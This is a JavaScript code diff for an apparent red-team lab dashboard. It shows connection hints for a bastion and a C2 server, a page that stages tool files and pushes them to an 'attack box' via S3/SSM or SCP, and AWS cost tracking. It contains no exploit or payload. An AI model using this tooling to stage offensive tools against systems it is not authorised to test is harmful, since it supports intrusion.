+    // Error messages stay visible longer (10s) so the user can read them
+    const duration = type === 'error' ? 10000 : 5000;
+    _messageTimeout = setTimeout(() => {
         messageDiv.classList.remove('show');
-    }, 5000);
+        _messageTimeout = null;
+    }, duration);
 }
 
 // ============================================================================
@@ -9945,7 +16653,7 @@ function updateQuickConnect(data) {
                 <div>
                     <strong>SSH Tunnel Required</strong>
                     <p style="margin: 5px 0 0 0; color: var(--warning-text);">
-                        RDP to bastion, then SSH tunnel to C2 server. GOAD accessible via VPC peering.
+                        SSH to bastion, then SSH tunnel to C2 server. GOAD accessible via VPC peering.
                     </p>
                 </div>
             </div>
@@ -9957,7 +16665,7 @@ function updateQuickConnect(data) {
                 <div>
                     <strong>SSH Tunnel Required</strong>
                     <p style="margin: 5px 0 0 0; color: var(--info-text);">
-                        RDP to bastion at <code>${data.infrastructure?.bastion?.ip || 'bastion_ip'}</code>, then create SSH tunnel to C2 server.
+                        SSH to bastion at <code>${data.infrastructure?.bastion?.ip || 'bastion_ip'}</code>, then create SSH tunnel to C2 server.
                     </p>
                 </div>
             </div>
@@ -10047,7 +16755,7 @@ function populateInfrastructureIPs(data) {
             const jumpboxPublicIp = document.getElementById('jumpbox-public-ip');
             const jumpboxSshCmd = document.getElementById('jumpbox-ssh-cmd');
             if (jumpboxPublicIp) jumpboxPublicIp.textContent = data.goad.jumpbox.public_ip;
-            if (jumpboxSshCmd) jumpboxSshCmd.textContent = `ssh -i goad-jumpbox.pem goad@${data.goad.jumpbox.public_ip}`;
+            if (jumpboxSshCmd) jumpboxSshCmd.textContent = `ssh ubuntu@${data.goad.jumpbox.public_ip} -i ~/.ssh/id_ed25519`;
         } else {
             goadJumpboxInfo.style.display = 'none';
         }
@@ -10174,9 +16882,1347 @@ async function downloadSshKey(keyType) {
 }
 
 // ============================================================================
+// TOOLS UPLOAD PAGE
+// ============================================================================
+
+let toolsConnectionInfo = null;
+let toolsTransferPollTimer = null;
+
+function escapeHtml(s) {
+    const d = document.createElement('div');
+    d.textContent = s;
+    return d.innerHTML;
+}
+
+// Cache for tools project list — avoids repeated terraform workspace calls
+let _toolsProjectsCache = null;
+
+async function loadToolsPage() {
+    console.log('Loading Tools page...');
+    await loadToolsProjects();
+    await refreshStagedFiles();
+    setupToolsDestinationListeners();
+}
+
+function invalidateToolsProjectsCache() {
+    _toolsProjectsCache = null;
+}
+
+async function loadToolsProjects(force = false) {
+    const select = document.getElementById('tools-project-select');
+    if (!select) return;
+
+    // Use frontend cache if available (backend also caches for 5 min)
+    if (!force && _toolsProjectsCache) {
+        _renderToolsProjectSelect(select, _toolsProjectsCache);
+        return;
+    }
+
+    try {
+        // Use the same active deployments source as Deployment Manager
+        const resp = await fetch(`${API_BASE}/deploy/active`);
+        const data = await resp.json();
+
+        if (!data.success || !data.deployments || data.deployments.length === 0) {
+            select.innerHTML = '<option value="">No active deployments found</option>';
+            updateToolsConnection(null);
+            _toolsProjectsCache = null;
+            return;
+        }
+
+        // Map deployment states to project format, only include ones with attack boxes
+        const projects = data.deployments
+            .filter(d => d.output?.attack_box_private_ip || d.deployment_type?.includes('c2') || d.deployment_type?.includes('combined'))
+            .map(d => ({
+                name: d._filename || d.project_name || 'default',
+                deployment_type: d.deployment_type || 'unknown',
+                completed_at: d.completed_at,
+            }));
+
+        if (projects.length === 0) {
+            select.innerHTML = '<option value="">No deployments with attack box found</option>';
+            updateToolsConnection(null);
+            _toolsProjectsCache = null;
+            return;
+        }
+
+        _toolsProjectsCache = projects;
+        _renderToolsProjectSelect(select, projects);
+    } catch (e) {
+        console.error('Failed to load tools projects:', e);
+        select.innerHTML = '<option value="">Error loading deployments</option>';
+    }
+}
+
+function _renderToolsProjectSelect(select, projects) {
+    const prevValue = select.value;
+    select.innerHTML = '';
+
+    if (!projects || projects.length === 0) {
+        select.innerHTML = '<option value="">No active deployments found</option>';
+        updateToolsConnection(null);
+        return;
+    }
+
+    select.innerHTML = '<option value="">-- Select a deployment --</option>';
+    for (const p of projects) {
+        const opt = document.createElement('option');
+        opt.value = p.name;
+        opt.textContent = `${p.name} (${p.deployment_type || 'unknown'})`;
+        select.appendChild(opt);
+    }
+
+    // Restore previous selection or auto-select if only one
+    if (prevValue && projects.some(p => p.name === prevValue)) {
+        select.value = prevValue;
+    } else if (projects.length === 1) {
+        select.value = projects[0].name;
+        loadToolsConnectionInfo(projects[0].name);
+    }
+
+    select.onchange = async () => {
+        if (select.value) {
+            await loadToolsConnectionInfo(select.value);
+        } else {
+            updateToolsConnection(null);
+        }
+    };
+}
+
+async function loadToolsConnectionInfo(project) {
+    const container = document.getElementById('tools-connection-status');
+    if (!container) return;
+
+    container.innerHTML = '<p class="t-muted">Checking connection...</p>';
+
+    try {
+        const resp = await fetch(`${API_BASE}/tools/connection-info?project=${encodeURIComponent(project)}`);
+        const data = await resp.json();
+
+        if (!data.success) {
+            container.innerHTML = `<p style="color: var(--danger);">${data.error || 'Failed to get connection info'}</p>`;
+            toolsConnectionInfo = null;
+            updateToolsTransferButton();
+            return;
+        }
+
+        toolsConnectionInfo = data;
+        updateToolsConnection(data);
+        updateToolsTransferButton();
+        updateToolsCommandPreview();
+    } catch (e) {
+        container.innerHTML = `<p style="color: var(--danger);">Error: ${e.message}</p>`;
+        toolsConnectionInfo = null;
+        updateToolsTransferButton();
+    }
+}
+
+function updateToolsConnection(data) {
+    const container = document.getElementById('tools-connection-status');
+    if (!container) return;
+
+    if (!data) {
+        container.innerHTML = '<p class="t-muted">Select a deployment above</p>';
+        toolsConnectionInfo = null;
+        updateToolsTransferButton();
+        return;
+    }
+
+    if (!data.has_attack_box) {
+        container.innerHTML = `<p style="color: var(--warning);">${data.message || 'This deployment does not have an attack box'}</p>`;
+        return;
+    }
+
+    if (!data.has_hop_host) {
+        container.innerHTML = `
+            <p style="color: var(--warning);">${data.message || 'No bastion or jumpbox found'}</p>
+            <p style="font-size: 0.85em; color: var(--text-muted); margin-top: 4px;">Attack Box IP: ${data.attack_box_ip}</p>
+        `;
+        return;
+    }
+
+    const s3Bucket = data.s3_bucket || '';
+    const instanceId = data.attack_box_instance_id || '';
+
+    container.innerHTML = `
+        <div style="display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 12px;">
+            <div>
+                <span style="font-size: 0.8em; color: var(--text-muted); display: block;">S3 Bucket</span>
+                <code style="font-size: 0.85em;">${s3Bucket || data.bastion_ip || '—'}</code>
+            </div>
+            <div>
+                <span style="font-size: 0.8em; color: var(--text-muted); display: block;">Attack Box</span>
+                <code style="font-size: 0.95em;">${data.attack_box_ip || '—'}</code>
+            </div>
+            <div>
+                <span style="font-size: 0.8em; color: var(--text-muted); display: block;">Transfer Method</span>
+                <span style="color: var(--success-text);">S3 → SSM</span>
+            </div>
+        </div>
+        <div style="margin-top: 6px; font-size: 0.8em; color: var(--text-muted);">
+            Files upload to S3, then download on attack box via IAM role. No SSH required.
+        </div>
+    `;
+}
+
+function setupToolsDestinationListeners() {
+    const radios = document.querySelectorAll('input[name="tools-dest"]');
+    const customInput = document.getElementById('tools-custom-dest');
+    if (!customInput) return;
+
+    radios.forEach(r => {
+        r.addEventListener('change', () => {
+            customInput.disabled = r.value !== 'custom';
+            if (r.value === 'custom') customInput.focus();
+            updateToolsCommandPreview();
+        });
+    });
+
+    customInput.addEventListener('input', updateToolsCommandPreview);
+}
+
+function getToolsDestination() {
+    const checked = document.querySelector('input[name="tools-dest"]:checked');
+    if (!checked) return 'C:\\Outflank\\';
+    if (checked.value === 'custom') {
+        return document.getElementById('tools-custom-dest')?.value || '';
+    }
+    return checked.value;
+}
+
+function updateToolsCommandPreview() {
+    const previewDiv = document.getElementById('tools-command-preview');
+    if (!previewDiv) return;
+
+    // Check if we have connection info
+    if (!toolsConnectionInfo || !toolsConnectionInfo.has_attack_box || !toolsConnectionInfo.has_hop_host) {
+        previewDiv.textContent = 'Select a deployment and stage files to see the SCP command';
+        return;
+    }
+
+    // Get staged file names from the list
+    const stagedItems = document.querySelectorAll('#tools-staged-list code');
+    const fileNames = Array.from(stagedItems).map(el => el.textContent);
+
+    if (fileNames.length === 0) {
+        previewDiv.textContent = 'Stage files to see the SCP command';
+        return;
+    }
+
+    const dest = getToolsDestination().replace(/\\/g, '/');
+    const keyPath = toolsConnectionInfo.ssh_key_path || '~/.ssh/id_ed25519';
+    const bastionIp = toolsConnectionInfo.bastion_ip;
+    const attackBoxIp = toolsConnectionInfo.attack_box_ip;
+
+    // Fixed colors for terminal-bg elements (always dark bg regardless of theme)
+    const clrComment = '#7A849E';
+    const clrCmd     = '#7ECF8C';
+    const clrValue   = '#C8D9A8';
+    const clrFile    = '#82BBE8';
+
+    // Build mkdir command
+    const mkdirDest = getToolsDestination();
+    let cmd = `<span style="color: ${clrComment};"># Create destination directory</span>\n`;
+    cmd += `<span style="color: ${clrCmd};">ssh</span>`;
+    cmd += ` -i <span style="color: ${clrValue};">${escapeHtml(keyPath)}</span>`;
+    cmd += ` -o ProxyJump=<span style="color: ${clrValue};">ubuntu@${escapeHtml(bastionIp)}</span>`;
+    cmd += ` <span style="color: ${clrValue};">Administrator@${escapeHtml(attackBoxIp)}</span>`;
+    cmd += ` "cmd /c mkdir \\"${escapeHtml(mkdirDest)}\\""\n\n`;
+
+    // Build SCP command(s)
+    cmd += `<span style="color: ${clrComment};"># Transfer ${fileNames.length} file${fileNames.length > 1 ? 's' : ''}</span>\n`;
+    for (const fname of fileNames) {
+        cmd += `<span style="color: ${clrCmd};">scp</span>`;
+        cmd += ` -i <span style="color: ${clrValue};">${escapeHtml(keyPath)}</span>`;
+        cmd += ` -o ProxyJump=<span style="color: ${clrValue};">ubuntu@${escapeHtml(bastionIp)}</span>`;
+        cmd += ` <span style="color: ${clrFile};">${escapeHtml(fname)}</span>`;
+        cmd += ` <span style="color: ${clrValue};">Administrator@${escapeHtml(attackBoxIp)}</span>:<span style="color: ${clrFile};">"${escapeHtml(dest)}"</span>`;
+        if (fname !== fileNames[fileNames.length - 1]) cmd += '\n';
+    }
+
+    previewDiv.innerHTML = cmd;
+}
+
+// --- File Upload ---
+
+function handleToolsDrop(event) {
+    // Handle both files and folders from drag-drop
+    const items = event.dataTransfer.items;
+    if (items && items.length > 0) {
+        const entries = [];
+        for (let i = 0; i < items.length; i++) {
+            const entry = items[i].webkitGetAsEntry?.();
+            if (entry) entries.push(entry);
+        }
+        if (entries.some(e => e.isDirectory)) {
+            // Has folders — recursively collect all files
+            collectFilesFromEntries(entries).then(files => {
+                if (files.length > 0) uploadToolsFiles(files);
+            });
+            return;
+        }
+    }
+    // Plain files
+    const files = event.dataTransfer.files;
+    if (files.length > 0) uploadToolsFiles(files);
+}
+
+async function collectFilesFromEntries(entries) {
+    const files = [];
+    async function readEntry(entry, path = '') {
+        if (entry.isFile) {
+            const file = await new Promise(r => entry.file(r));
+            // Preserve relative path for folder structure
+            Object.defineProperty(file, 'relativePath', { value: path + file.name });
+            files.push(file);
+        } else if (entry.isDirectory) {
+            const reader = entry.createReader();
+            const subEntries = await new Promise(r => reader.readEntries(r));
+            for (const sub of subEntries) {
+                await readEntry(sub, path + entry.name + '/');
+            }
+        }
+    }
+    for (const entry of entries) await readEntry(entry);
+    return files;
+}
+
+function handleToolsFileSelect(event) {
+    const files = event.target.files;
+    if (files.length > 0) uploadToolsFiles(files);
+    event.target.value = '';
+}
+
+function handleToolsFolderSelect(event) {
+    const files = event.target.files;
+    if (files.length > 0) {
+        // webkitdirectory gives us files with webkitRelativePath
+        const fileArray = Array.from(files);
+        fileArray.forEach(f => {
+            if (f.webkitRelativePath) {
+                Object.defineProperty(f, 'relativePath', { value: f.webkitRelativePath });
+            }
+        });
+        uploadToolsFiles(fileArray);
+    }
+    event.target.value = '';
+}
+
+async function uploadToolsFiles(fileList) {
+    const progressDiv = document.getElementById('tools-upload-progress');
+    const progressBar = document.getElementById('tools-upload-progress-bar');
+    const progressText = document.getElementById('tools-upload-progress-text');
+
+    for (let i = 0; i < fileList.length; i++) {
+        const file = fileList[i];
+        progressDiv.style.display = 'block';
+        progressBar.style.width = '0%';
+        progressText.textContent = `Uploading ${file.name} (${i + 1}/${fileList.length})...`;
+
+        const formData = new FormData();
+        formData.append('file', file);
+        // Pass relative path for folder structure preservation
+        const relPath = file.relativePath || file.webkitRelativePath || file.name;
+        formData.append('relative_path', relPath);
+
+        try {
+            const result = await new Promise((resolve, reject) => {
+                const xhr = new XMLHttpRequest();
+                xhr.open('POST', `${API_BASE}/tools/upload`);
+
+                xhr.upload.onprogress = (e) => {
+                    if (e.lengthComputable) {
+                        const pct = Math.round((e.loaded / e.total) * 100);
+                        progressBar.style.width = pct + '%';
+                        progressText.textContent = `Uploading ${file.name}: ${pct}%`;
+                    }
+                };
+
+                xhr.onload = () => {
+                    const data = JSON.parse(xhr.responseText);
+                    if (data.success) resolve(data);
+                    else reject(new Error(data.error || 'Upload failed'));
+                };
+
+                xhr.onerror = () => reject(new Error('Network error'));
+                xhr.send(formData);
+            });
+        } catch (e) {
+            progressText.textContent = `Failed: ${e.message}`;
+            progressBar.style.width = '100%';
+            progressBar.style.background = 'var(--danger)';
+            await new Promise(r => setTimeout(r, 2000));
+            progressBar.style.background = 'var(--gold)';
+        }
+    }
+
+    progressDiv.style.display = 'none';
+    await refreshStagedFiles();
+}
+
+async function refreshStagedFiles() {
+    const listDiv = document.getElementById('tools-staged-list');
+    const actionsDiv = document.getElementById('tools-staged-actions');
+    if (!listDiv) return;
+
+    try {
+        const resp = await fetch(`${API_BASE}/tools/staged`);
+        const data = await resp.json();
+
+        if (!data.success || data.count === 0) {
+            listDiv.innerHTML = '<p style="color: var(--text-muted); font-size: 0.9em;">No files staged</p>';
+            if (actionsDiv) actionsDiv.style.display = 'none';
+            updateToolsTransferButton();
+            updateToolsCommandPreview();
+            return;
+        }
+
+        let html = '';
+        for (const f of data.files) {
+            const safeName = escapeHtml(f.filename);
+            html += `
+                <div style="display: flex; align-items: center; justify-content: space-between; padding: 6px 10px; border-bottom: 1px solid var(--border);">
+                    <div style="display: flex; align-items: center; gap: 10px;">
+                        <code style="font-size: 0.9em; color: var(--text-primary);">${safeName}</code>
+                        <span style="font-size: 0.8em; color: var(--text-muted);">${f.size_mb} MB</span>
+                    </div>
+                    <button class="btn btn-sm btn-danger" onclick="deleteToolsFile('${safeName}')">Delete</button>
+                </div>
+            `;
+        }
+        listDiv.innerHTML = html;
+        if (actionsDiv) actionsDiv.style.display = data.count > 1 ? 'block' : 'none';
+        updateToolsTransferButton();
+        updateToolsCommandPreview();
+    } catch (e) {
+        listDiv.innerHTML = `<p style="color: var(--danger); font-size: 0.9em;">Error: ${e.message}</p>`;
+    }
+}
+
+async function deleteToolsFile(filename) {
+    try {
+        await fetch(`${API_BASE}/tools/staged`, {
+            method: 'DELETE',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ filename }),
+        });
+        await refreshStagedFiles();
+    } catch (e) {
+        console.error('Delete failed:', e);
+    }
+}
+
+async function clearAllToolsFiles() {
+    try {
+        await fetch(`${API_BASE}/tools/staged`, {
+            method: 'DELETE',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ filename: 'all' }),
+        });
+        await refreshStagedFiles();
+    } catch (e) {
+        console.error('Clear all failed:', e);
+    }
+}
+
+// --- Transfer ---
+
+function updateToolsTransferButton() {
+    const btn = document.getElementById('tools-transfer-btn');
+    if (!btn) return;
+
+    const listDiv = document.getElementById('tools-staged-list');
+    const hasFiles = listDiv && !listDiv.textContent.includes('No files staged');
+    const hasConnection = toolsConnectionInfo && toolsConnectionInfo.ready;
+
+    btn.disabled = !(hasFiles && hasConnection);
+}
+
+async function startToolsTransfer() {
+    const btn = document.getElementById('tools-transfer-btn');
+    const logCard = document.getElementById('tools-transfer-log-card');
+    const logDiv = document.getElementById('tools-transfer-log');
+    const progressBar = document.getElementById('tools-transfer-progress-bar');
+    const progressText = document.getElementById('tools-transfer-progress-text');
+
+    const project = document.getElementById('tools-project-select')?.value;
+    const destination = getToolsDestination();
+
+    if (!project) {
+        alert('Select a deployment first');
+        return;
+    }
+    if (!destination) {
+        alert('Enter a destination path');
+        return;
+    }
+
+    // Get staged file names
+    let stagedResp;
+    try {
+        stagedResp = await (await fetch(`${API_BASE}/tools/staged`)).json();
+    } catch (e) {
+        alert('Failed to get staged files');
+        return;
+    }
+
+    const files = (stagedResp.files || []).map(f => f.filename);
+    if (files.length === 0) {
+        alert('No files staged for transfer');
+        return;
+    }
+
+    // Show log area
+    logCard.style.display = 'block';
+    logDiv.textContent = 'Starting transfer...\n';
+    progressBar.style.width = '0%';
+    progressText.textContent = `0/${files.length} files`;
+    btn.disabled = true;
+    btn.textContent = 'Transferring...';
+
+    try {
+        const resp = await fetch(`${API_BASE}/tools/transfer`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ files, destination, project }),
+        });
+        const data = await resp.json();
+
+        if (!data.success) {
+            logDiv.textContent += `ERROR: ${data.error}\n`;
+            btn.disabled = false;
+            btn.textContent = 'Transfer to Attack Box';
+            return;
+        }
+
+        // Start polling
+        pollToolsTransfer(data.transfer_id);
+    } catch (e) {
+        logDiv.textContent += `ERROR: ${e.message}\n`;
+        btn.disabled = false;
+        btn.textContent = 'Transfer to Attack Box';
+    }
+}
+
+function pollToolsTransfer(transferId) {
+    if (toolsTransferPollTimer) clearInterval(toolsTransferPollTimer);
+
+    const logDiv = document.getElementById('tools-transfer-log');
+    const progressBar = document.getElementById('tools-transfer-progress-bar');
+    const progressText = document.getElementById('tools-transfer-progress-text');
+    const btn = document.getElementById('tools-transfer-btn');
+
+    let lastLogCount = 0;
+
+    toolsTransferPollTimer = setInterval(async () => {
+        try {
+            const resp = await fetch(`${API_BASE}/tools/transfer/${transferId}`);
+            const data = await resp.json();
+
+            if (!data.success) {
+                clearInterval(toolsTransferPollTimer);
+                return;
+            }
+
+            const t = data.transfer;
+
+            // Update logs (append only new lines)
+            if (t.logs.length > lastLogCount) {
+                const newLogs = t.logs.slice(lastLogCount);
+                for (const line of newLogs) {
+                    // Color-code log lines (terminal-safe variables — always bright on dark bg)
+                    let color = 'var(--text-terminal)';
+                    if (line.startsWith('OK ')) color = 'var(--terminal-success)';
+                    else if (line.startsWith('FAIL ') || line.startsWith('ERROR') || line.startsWith('TIMEOUT')) color = 'var(--terminal-danger)';
+                    else if (line.startsWith('SKIP ') || line.startsWith('Warning')) color = 'var(--terminal-warning)';
+                    else if (line.startsWith('[') || line.startsWith('Starting') || line.startsWith('Creating')) color = 'var(--terminal-info)';
+
+                    logDiv.innerHTML += `<span style="color: ${color};">${escapeHtml(line)}</span>\n`;
+                }
+                lastLogCount = t.logs.length;
+                logDiv.scrollTop = logDiv.scrollHeight;
+            }
+
+            // Update progress
+            const prog = t.progress;
+            if (prog && prog.total > 0) {
+                const pct = Math.round((prog.completed / prog.total) * 100);
+                progressBar.style.width = pct + '%';
+                const currentInfo = prog.current ? ` — ${prog.current}` : '';
+                progressText.textContent = `${prog.completed}/${prog.total} files${currentInfo}`;
+            }
+
+            // Check if complete
+            if (t.status !== 'running' && t.status !== 'starting') {
+                clearInterval(toolsTransferPollTimer);
+                toolsTransferPollTimer = null;
+
+                if (t.status === 'success') {
+                    progressBar.style.background = 'var(--success)';
+                    progressBar.style.width = '100%';
+                } else if (t.status === 'error') {
+                    progressBar.style.background = 'var(--danger)';
+                } else {
+                    progressBar.style.background = 'var(--warning)';
+                }
+
+                btn.disabled = false;
+                btn.textContent = 'Transfer to Attack Box';
+
+                // Reset progress bar color after a delay
+                setTimeout(() => {
+                    progressBar.style.background = 'var(--gold)';
+                }, 5000);
+            }
+        } catch (e) {
+            console.error('Transfer poll error:', e);
+        }
+    }, 2000);
+}
+
+// ============================================================================
+// COST TRACKER — Settings page cost management + Deployment Manager budget alert
+// ============================================================================
+
+async function loadCostSettings() {
+    try {
+        const resp = await fetch('/api/costs/settings');
+        const data = await resp.json();
+        if (data.success) {
+            const budgetInput = document.getElementById('budget-threshold');
+            if (budgetInput) budgetInput.value = data.budget_threshold || 500;
+        }
+    } catch (e) {
+        console.error('Error loading cost settings:', e);
+    }
+}
+
+async function saveCostSettings() {
+    const budgetInput = document.getElementById('budget-threshold');
+    const payload = {
+        budget_threshold: parseFloat(budgetInput?.value) || 500,
+    };
+    try {
+        const resp = await fetch('/api/costs/settings', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload),
+        });
+        if (resp.ok && typeof showMessage === 'function') {
+            showMessage('Cost settings saved', 'success');
+        }
+    } catch (e) {
+        console.error('Error saving cost settings:', e);
+    }
+}
+
+async function loadCostProjectSelector() {
+    const selector = document.getElementById('cost-project-selector');
+    if (!selector) return;
+
+    // Restore last-refreshed timestamp from cache
+    const btn = document.getElementById('cost-refresh-btn');
+    const cachedTime = localStorage.getItem('cost_last_refreshed');
+    if (btn && cachedTime) {
+        btn.textContent = `Refresh Costs — last updated ${cachedTime}`;
+    }
+
+    try {
+        const resp = await fetch('/api/costs/projects');
+        const data = await resp.json();
+        if (!data.success || !data.projects.length) {
+            selector.innerHTML = '<option value="">No projects found</option>';
+            _showCostEmptyState(true);
+            return;
+        }
+
+        _showCostEmptyState(false);
+        let html = '';
+        const active = data.projects.filter(p => p.status === 'active');
+        const destroyed = data.projects.filter(p => p.status === 'destroyed');
+
+        if (active.length) {
+            html += '<optgroup label="Active">';
+            active.forEach(p => {
+                html += `<option value="${p.name}" data-status="active">[Active] ${p.name} (${p.deployment_type})</option>`;
+            });
+            html += '</optgroup>';
+        }
+        if (destroyed.length) {
+            html += '<optgroup label="Destroyed">';
+            destroyed.forEach(p => {
+                html += `<option value="${p.name}" data-status="destroyed">[Destroyed] ${p.name} (${p.deployment_type})</option>`;
+            });
+            html += '</optgroup>';
+        }
+
+        selector.innerHTML = html;
+        // Auto-select first active, or first overall
+        if (active.length) selector.value = active[0].name;
+
+        // Show awaiting message immediately if a project is selected
+        if (selector.value) {
+            const container = document.getElementById('cost-summary-cards');
+            if (container && !container.innerHTML.trim()) {
+                container.innerHTML = `
+                    <div class="callout callout--warning" style="margin: 0; grid-column: 1 / -1;">
+                        <strong>Awaiting cost data from AWS Cost Explorer.</strong><br>
+                        Cost data typically takes 24-48 hours to appear after deployment. Click "Refresh Costs" to check for updates.
+                    </div>
+                `;
+            }
+        }
+    } catch (e) {
+        console.error('Error loading cost projects:', e);
+        selector.innerHTML = '<option value="">Error loading projects</option>';
+    }
+}
+
+async function loadProjectCosts() {
+    const selector = document.getElementById('cost-project-selector');
+    const project = selector?.value;
+    const btn = document.getElementById('cost-refresh-btn');
+
+    if (!project) {
+        if (btn) btn.textContent = 'Refresh Costs — no project selected';
+        return;
+    }
+    if (btn) { btn.disabled = true; btn.textContent = 'Refreshing...'; }
+
+    try {
+        const url = `/api/costs/summary?project=${encodeURIComponent(project)}&force=true`;
+        const resp = await fetch(url);
+        const data = await resp.json();
+
+        if (!data.success) {
+            if (btn) { btn.disabled = false; btn.textContent = 'Refresh Costs — failed'; }
+            return;
+        }
+
+        renderCostSummaryCards(data);
+
+        const actualHasData = data.actual_costs?.available && data.actual_costs.total > 0.01;
+        const untrackedCallout = document.getElementById('cost-untracked-callout');
+        if (actualHasData) {
+            renderBudgetProgressBar(data.budget);
+            renderCostTrend(data.actual_costs);
+            renderCostBreakdown(data);
+            if (untrackedCallout) untrackedCallout.style.display = '';
+        } else {
+            if (untrackedCallout) untrackedCallout.style.display = 'none';
+            // Hide budget bar, trend, breakdown when no actual data
+            const budgetSection = document.getElementById('cost-budget-bar-section');
+            const trendSection = document.getElementById('cost-trend-section');
+            const breakdownSection = document.getElementById('cost-breakdown-section');
+            if (budgetSection) budgetSection.style.display = 'none';
+            if (trendSection) trendSection.style.display = 'none';
+            if (breakdownSection) breakdownSection.style.display = 'none';
+        }
+        // Remove stale error callouts
+        const oldCallout = document.getElementById('cost-error-callout');
+        if (oldCallout) oldCallout.remove();
+
+        if (btn) {
+            btn.disabled = false;
+            const now = new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
+            btn.textContent = `Refresh Costs — last updated ${now}`;
+            localStorage.setItem('cost_last_refreshed', now);
+        }
+    } catch (e) {
+        console.error('Error loading project costs:', e);
+        if (btn) { btn.disabled = false; btn.textContent = 'Refresh Costs — error'; }
+    }
+}
+
+function refreshCosts() {
+    loadProjectCosts();
+}
+
+function renderCostSummaryCards(data) {
+    const container = document.getElementById('cost-summary-cards');
+    if (!container) return;
+
+    const actual = data.actual_costs || {};
+    const budget = data.budget || {};
+    const actualHasData = actual.available && actual.total > 0.01;
+
+    // If no actual Cost Explorer data, show a waiting state instead of estimates
+    if (!actualHasData) {
+        container.innerHTML = `
+            <div class="callout callout--warning" style="margin: 0; grid-column: 1 / -1;">
+                <strong>Awaiting cost data from AWS Cost Explorer.</strong><br>
+                Cost data typically takes 24-48 hours to appear after deployment. Click "Refresh Costs" to check for updates.
+            </div>
+        `;
+        return;
+    }
+
+    // Actual Cost Explorer data is available — render real figures
+    const totalSpend = actual.total;
+    const daysWithCost = (actual.daily_costs || []).filter(d => d.total > 0).length;
+    const dailyAvg = daysWithCost > 0 ? totalSpend / daysWithCost : 0;
+
+    const budgetRemaining = budget.threshold > 0 ? budget.remaining : null;
+    const budgetClass = budget.used_percent >= 100 ? 'cost-value--danger'
+        : budget.used_percent >= 80 ? 'cost-value--warning'
+        : 'cost-value--success';
+
+    // Projected monthly based on actual daily average
+    const estMonthly = dailyAvg * 30;
+
+    container.innerHTML = `
+        <div class="lifecycle-card">
+            <h4>Total Spend</h4>
+            <div class="cost-value">$${totalSpend.toFixed(2)}</div>
+            <div class="cost-label">Actual (Cost Explorer)</div>
+        </div>
+        <div class="lifecycle-card">
+            <h4>Daily Average</h4>
+            <div class="cost-value">$${dailyAvg.toFixed(2)}</div>
+            <div class="cost-label">${daysWithCost} day${daysWithCost !== 1 ? 's' : ''} with charges</div>
+        </div>
+        <div class="lifecycle-card">
+            <h4>Budget Remaining</h4>
+            <div class="cost-value ${budgetClass}">${budgetRemaining !== null ? '$' + budgetRemaining.toFixed(2) : 'No budget set'}</div>
+            <div class="cost-label">${budget.threshold > 0 ? 'of $' + budget.threshold + ' budget' : 'Set in settings above'}</div>
+        </div>
+        <div class="lifecycle-card">
+            <h4>Est. Monthly</h4>
+            <div class="cost-value">$${estMonthly.toFixed(2)}</div>
+            <div class="cost-label">projected from actual daily avg</div>
+        </div>
+    `;
+}
+
+function renderBudgetProgressBar(budget) {
+    const section = document.getElementById('cost-budget-bar-section');
+    if (!section || !budget || budget.threshold <= 0) {
+        if (section) section.style.display = 'none';
+        return;
+    }
+
+    section.style.display = 'block';
+    const pct = Math.min(budget.used_percent, 100);
+    const fillClass = budget.used_percent >= 100 ? 'cost-budget-bar__fill--danger'
+        : budget.used_percent >= 80 ? 'cost-budget-bar__fill--warning'
+        : 'cost-budget-bar__fill--ok';
+
+    const fill = document.getElementById('cost-budget-fill');
+    const label = document.getElementById('cost-budget-label');
+    const pctSpan = document.getElementById('cost-budget-pct');
+
+    if (fill) {
+        fill.style.width = pct + '%';
+        fill.className = 'cost-budget-bar__fill ' + fillClass;
+    }
+    if (label) {
+        label.textContent = `$${(budget.threshold - budget.remaining).toFixed(2)} of $${budget.threshold}`;
+    }
+    if (pctSpan) {
+        pctSpan.textContent = budget.used_percent.toFixed(1) + '%';
+    }
+}
+
+function renderCostTrend(actualCosts) {
+    const section = document.getElementById('cost-trend-section');
+    const chart = document.getElementById('cost-trend-chart');
+    if (!section || !chart) return;
+
+    if (!actualCosts?.available || !actualCosts.daily_costs?.length) {
+        section.style.display = 'none';
+        return;
+    }
+
+    // Show last 14 days — but hide if all days are $0
+    const days = actualCosts.daily_costs.slice(-14);
+    const hasNonZero = days.some(d => d.total > 0.001);
+    if (!hasNonZero) {
+        section.style.display = 'none';
+        return;
+    }
+
+    const maxCost = Math.max(...days.map(d => d.total), 0.01);
+
+    section.style.display = 'block';
+    chart.innerHTML = days.map(day => {
+        const pct = (day.total / maxCost) * 100;
+        const dateLabel = new Date(day.date + 'T00:00:00').toLocaleDateString('en-US', { month: 'short', day: 'numeric' });
+        return `
+            <div class="cost-trend-row">
+                <span class="cost-trend-date">${dateLabel}</span>
+                <div class="cost-trend-bar-container">
+                    <div class="cost-trend-bar" style="width: ${pct}%;"></div>
+                </div>
+                <span class="cost-trend-value">$${day.total.toFixed(2)}</span>
+            </div>
+        `;
+    }).join('');
+}
+
+function renderCostBreakdown(data) {
+    const section = document.getElementById('cost-breakdown-section');
+    const tableDiv = document.getElementById('cost-breakdown-table');
+    if (!section || !tableDiv) return;
+
+    const actual = data.actual_costs || {};
+    const serviceBreakdown = actual?.available ? _aggregateServiceCosts(actual.daily_costs) : {};
+
+    if (!Object.keys(serviceBreakdown).length) {
+        section.style.display = 'none';
+        return;
+    }
+
+    section.style.display = 'block';
+    const serviceTotal = Object.values(serviceBreakdown).reduce((s, v) => s + v, 0);
+    let rows = '';
+
+    Object.entries(serviceBreakdown)
+        .sort((a, b) => b[1] - a[1])
+        .forEach(([service, total]) => {
+            const pct = serviceTotal > 0 ? ((total / serviceTotal) * 100) : 0;
+            const daily = total / 30;
+            rows += `
+                <tr>
+                    <td>${service}</td>
+                    <td>$${daily.toFixed(2)}</td>
+                    <td>$${total.toFixed(2)}</td>
+                    <td>
+                        <span class="cost-pct-bar" style="width: ${pct}px;"></span>
+                        ${pct.toFixed(0)}%
+                    </td>
+                </tr>
+            `;
+        });
+
+    tableDiv.innerHTML = `
+        <table class="cost-breakdown-table">
+            <thead>
+                <tr>
+                    <th>Service</th>
+                    <th>Daily Avg</th>
+                    <th>Total (30d)</th>
+                    <th>%</th>
